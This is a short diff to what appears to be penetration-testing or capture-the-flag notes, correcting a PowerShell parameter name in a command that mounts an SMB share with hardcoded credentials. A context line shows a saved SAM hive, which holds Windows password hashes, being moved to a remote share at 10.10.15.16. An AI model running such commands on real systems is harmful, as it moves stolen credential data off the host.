@@ -13,7 +13,7 @@ move sam.save \\10.10.15.16\CompData
 
 $pass = convertto-securestring 'staphy' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('staphy',$pass)
-New-PSDrive -Name "staphy" -PSProvider "FileSystem" -Credentials $creds -Root "\\<IP>\Public"
+New-PSDrive -Name "staphy" -PSProvider "FileSystem" -Credential $creds -Root "\\<IP>\Public"
 cd staphy:
 ```
 
